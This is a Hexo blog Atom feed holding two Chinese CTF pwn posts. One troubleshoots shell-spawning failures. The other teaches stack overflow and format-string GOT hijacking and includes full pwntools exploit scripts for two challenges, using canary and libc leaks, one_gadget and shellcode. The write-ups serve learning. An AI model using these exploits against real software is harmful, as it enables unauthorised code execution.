<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-10-29T09:17:48.073Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>changyangr</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwn 出现  Got EOF while reading in interactive 报错</title>
    <link href="http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/"/>
    <id>http://example.com/2021/10/29/pwn-Got-EOF-while-reading-in-interactive/</id>
    <published>2021-10-29T08:54:33.000Z</published>
    <updated>2021-10-29T09:17:48.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="pwn-出现-Got-EOF-while-reading-in-interactive-报错"><a href="#pwn-出现-Got-EOF-while-reading-in-interactive-报错" class="headerlink" title="pwn 出现  Got EOF while reading in interactive 报错"></a>pwn 出现  Got EOF while reading in interactive 报错</h2> <font face="黑体" color="#49b1f5" size="5"><p> 出现Got EOF while reading in interactive 的报错，就我目前为止，所遇到的，有 3 情况 :</p><ol><li>地址错误，导致没有 get shell；</li></ol></font><font color="red">地址错误的话，需要查看 libc 的版本是否是对的。一般来说 远程打不通，本地能通都是这个问题。推荐下一个 LibcSearcher ,虽然有 libc database search 网站可以查阅，但网站了里面的 libc 似乎是不全的。或则直接就是 你的地址没有找对。建议 现在本地尝试一下。 本地的 libc 加载地址是不变的。当然堆题 需要利用 libc 漏洞的话，就不建议了。 </font> <font face="黑体" color="#49b1f5" size="5"><ol start="2"><li>栈没有对齐。</li></ol></font><font color="red">栈没有对齐一般是因为 Ubuntu18.04 64位 和 部分 Ubuntu16.04 64位 调用 system 的时候，rsp 的最低字节必须为 0x00（栈以16字节对齐），否则无法运行 system 指令。<p> 要解决这个问题，只要将返回地址设置为跳过函数开头的 push rbp 就可以了。(加 ret 也同样好使。)<br> 有时候也可能是因为 ret 而导致的不能 get shell 。 有时候 ret 为奇数能 get shell ，为偶数不能。 反之亦然。<br> 所以遇到这种情况多试试就行了。<br> </p></font><p></p> <font face="黑体" color="#49b1f5" size="5"><ol start="3"><li>没有返回地址。</li></ol> </font> <font color="red"><p> 没有返回地址一样可能会造成 错误而无法 get shell。 加上就行  如：  p64(0xdeadbeef) 和 p32(0)<br> </p></font><p></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>重新做人之 pwn 栈溢出</title>
    <link href="http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <id>http://example.com/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/</id>
    <published>2021-10-28T06:27:45.000Z</published>
    <updated>2021-10-29T09:31:43.528Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2> <font color="red"><p> 函数状态主要涉及三个寄存器－－esp，ebp，eip。<br> esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。<br> ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。<br> eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><p> 这是一个栈：<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/zhan.jpg"><br> caller: 调用函数<br> callee: 被调用函数<br> 我们通过函数向栈里面写入的数据应是从 argn 开始，一路写进去，最后覆盖 callee 的 return address。<br> 所以一般的 payload= padding + (ebp) + (eip)<br> ebp 的覆盖一般来说可以任意。</p> </font><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><h3 id="格式化字符串介绍"><a href="#格式化字符串介绍" class="headerlink" title="格式化字符串介绍"></a>格式化字符串介绍</h3> <font color="red"><pre><code>格式化字符串是一个使 printf 类函数 错误的漏洞，虽然利用方法（对我来说）较难，但是利用方式却多样。</code></pre> </font> <font color="Blue">  <p> 格式化字符串 漏洞 ：<br>    %x : 输出一个16进制数，前面没有 0x<br>    %p : 输出一个16进制数，前面带有 0x （一般来说，使用 %p 来泄露地址）<br>    %c : 写入一个字符，用来填充字符 如 %13c，经 printf 识别，就会写入13个字符。 劫持 got 表时，需要用到。<br>    %s : 输出一个字符串。 可以用来泄露地址。<br>    %n : 写入一个数字，且为已写入字符的数量，配合 %c 修改地址。<br>    （除了%n,还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。）</p> </font> <font face="黑体" color="red" size="5"><p> 32位是通过堆栈传参<br> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）<br> 注意：<br> 我们向栈里写入的数据是先存放在栈上，后通过 printf 识别，再输出的。所以 本身的 %p 之类被识别的指令，也是会在栈上占据位置。 </p> </font> <font color="green"><p> 32位 格式化字符串漏洞的 got表 劫持：<br> offset = 5<br> payload=p32(got)+’%’+str(system-4)+’c%5$n’ 将got里存放的地址写为system的 地址。</p><p> 也可以这么写：<br> offset = 5<br> payload=p32(got)+p32(got+1)+p32(got+2)+p32(got+3)<br> payload+=’%’+str()+’c%5$hhn’<br> payload+=’%’+str()+’c%6$hhn’<br> payload+=’%’+str()+’c%7$hhn’<br> payload+=’%’+str()+’c%8$hhn’<br> 依照位次而定，每一个覆盖是2位。（因为无论是32位或是64位 汇编，都是小端序，所以需要倒着写）</p> </font> <font color="red"><p> 64位 格式化字符串漏洞的 got表 劫持：</p><p> 64位是通过寄存器+堆栈传参，顺序依次是：rdi、rsi、rdx、rcx、r8、r9（edi、esi、edx、ecx、r8、r9）</p><p> offset=6    一般情况下偏移为 6 或 7</p><p> 由于64位下用户可见的内存地址高位都带有\x00(64位地址共16个16进制数)，而 \x00 是字符串结束符。<br> 所以 应把要改 的 got表地址 放在后面，且不能用%hhn 分段写。<br> 如：<br> payload=’a%’+str(system-1)+’c%8$lln’+p64(got)     加 a 是为了使得数据在栈上对齐。</p> </font><h3 id="例题：mid-canary"><a href="#例题：mid-canary" class="headerlink" title="例题：mid-canary"></a>例题：mid-canary</h3> <font color="red"> libc 为 libc-2.23.11.3 checksec 使用带 canary 的64位 elf 程序。 一个一轮游的 格式化字符串漏洞。 <p> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca1.png"></p><p> 因为只走一轮，且有 canary 所以肯定不能够直接拿到shell。</p><p> 只有 劫持 stack_chk_fail 函数为 main 函数。</p><p> 在输入之后，输出之前下断点查看寄存器的值。<br> <img src="/2021/10/28/%E9%87%8D%E6%96%B0%E5%81%9A%E4%BA%BA%E4%B9%8B-pwn-%E6%A0%88%E6%BA%A2%E5%87%BA/ca2.png"></p><p> 发现 rcx 里的存放着 write_nocancel+7 的值,而 write_nocancel 为调用write 需要调用的函数，且彼此之间的偏移是固定的。</p><p> 所以我们只需要泄露出 rcx 的值就可以计算出 write_addr ，从而泄露出 libc 的偏移。</p><p> 而 rcx 为64位 传参的第4位，但是 经过测试 发现 偏移为 3 ，即 %3$p 能泄露出地址。</p><p> exp 逻辑： 利用 printf 修改 stack_chk_fail 的got表的地址 为 main 函数，故意触发 stack_chk_fail 返回 main 函数，再次利用 printf 拿到 write_nocancel+7 的地址。最后利用 ogg 拿到shell。</p><p> 所以 exp 如下：<br> </p></font><br> <font color="white"><br> <table><tr><td bgcolor="black"><br> from pwn import *<br> from LibcSearcher import *<p></p><p> def debug():<br>    gdb.attach(io)<br>    pause()<br> context.log_level = ‘debug’<br> io = process(“./ca”)<br> elf=ELF(“ca”)<br> ogg=[0x45226,0x4527a,0xf03a4,0xf1247]<br> check_fail=elf.got[‘__stack_chk_fail’]<br> write_got=elf.got[‘write’]<br> print(hex(write_got))<br> main_addr=0x00400737</p><p> payload=’a%’+str(main_addr-1)+’c%8$lln’<br> payload+=p64(check_fail)<br> payload=payload.ljust(0x118,’a’)</p><p> #payload=’aaab%7$s’+p64(write_got)</p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> debug()<br> io.recvuntil(“Hello “)<br> junk1=io.recv(16)<br> print(junk1)</p><p> #io.recvuntil(“aaab”)<br> #canary=u64(io.recv(18).ljust(8,’\x00’))<br> #canary=int(io.recvuntil(‘0x’,drop=True),16)-240  不用泄露 canary。而且 canary被覆盖住了，泄露不出来。</p><p> io.recvuntil(“What is your name: “)<br> exploit=’aaab’+’%3$p’</p><p> exploit=exploit.ljust(0x118,’a’)<br> io.sendline(exploit)<br> io.recvuntil(“Hello “)<br> io.recvuntil(‘ab’)</p><p> junk=int(io.recv(14),16)-0x10</p><p> #junk=u64(io.recv(6).ljust(8,’\x00’))</p><p> libc=LibcSearcher(‘write’,junk)<br> print(hex(junk))</p><p> base=junk-libc.dump(‘write’)<br> ogg_addr=ogg[0]+base</p><p> payload=’a’*0x118+p64(ogg_addr)   </p><p> io.recvuntil(“What is your name: “)<br> io.sendline(payload)<br> io.interactive()</p> </td></tr></table></font><h3 id="ez-ret3"><a href="#ez-ret3" class="headerlink" title="ez_ret3"></a>ez_ret3</h3> <font color="#49b1f5"> 保护全开的64位elf文件。 <p> 值得注意的是，这个文件也是一个格式化字符串漏洞，同时，在 rcx 的位置放了 read__nocancel+7 ,可能是 libc 的原因？<br> 栈上也有 libc_start_main 的地址，这里泄露 read_nocancel+7 的地址。</p><p> 麻烦的点在于 pie 绕过 ，开启了 pie 后 data段、 text段、 bss段 的地址都会产生偏移，无法用 elf 的操作去得到地址。<br> 但是 地址的后三位是不变的，同时我们只能输入 2 的整数倍的字节数，所以一开始的想法是 爆破第4位。可是换了远程使用的 libc 后，就没有成功过。本地倒是能行。</p><p> exp 逻辑： 首先通过格式化字符串漏洞 拿到 canary 的值，通过覆盖 \x00 返回 main 函数，通过 printf 泄露 read_nocancel+7 地址，最后利用 ogg 拿到 shell<br> 标准 exp 是覆盖 \x00 不太明白。</p><p> exp 如下：<br> </p></font><p></p> <table><tr><td bgcolor="black"> <font color="white"><p> #coding=utf-8<br> from pwn import *<br> context(log_level = ‘debug’, arch = ‘amd64’, os = ‘linux’)</p><p> def debug():<br>    gdb.attach(io)<br>       pause()</p><p> #io = remote(“39.103.198.196”,’10009’)<br> main=0x00000009ED<br> ogg=[0x45226,0x4527a,0xf03a4,0xf1247]<br> io = process(‘./tang’)<br> #io = remote(“39.103.198.196”,’10009’)<br> elf=ELF(‘tang’)<br> libc=ELF(“/home/boy/downloads/pwn-change-libc-main/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so”)<br> payload=’%9$p’<br> shellcode=’a’*(0xbca-0xb78)<br> print(0xbca-0xb78)<br> shellcode+=asm(shellcraft.sh())<br> xx=io.recvline()<br> io.sendline(payload)<br> #debug()<br> canary=int(io.recv(18),16)<br> print(hex(canary))<br> #canary=u64(canary)<br> io.recvline()<br> sleep(0.1)<br> io.recvline()<br> io.sendline(shellcode)<br> junk=io.recvline()<br> print(junk)<br> #list1 =<br>  [‘\x09’,’\x19’,’\x29’,’\x39’,’\x49’,’\x59’,’\x69’,’\x79’,’\x89’,’\x99’,’\xa9’,’\xb9’,’\xc9’,’\xd9’,’\xe9’,’\xf9’]<br> exploit=’a’*0x38+p64(canary)+’a’*0x18+’\x00’<br> #debug()<br> sleep(0.1)<br> #debug()<br> io.send(exploit)<br> io.send(‘a%3$p’)<br> io.recvuntil(‘a’)<br> write_addr=int(io.recv(14),16)+0x50<br> print(hex(write_addr))<br> base=write_addr-libc.symbols[‘write’]<br> ogg_addr=base+ogg[3]<br> payload=’a’*0x38+p64(canary)+’a’*0x10+’a’*0x8+p64(ogg_addr)<br> io.recvline()<br> io.sendline(shellcode)<br> junk=io.recvline()<br> print(junk)<br> io.sendline(payload)<br> io.interactive()</p> </font></td></tr></table> ]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
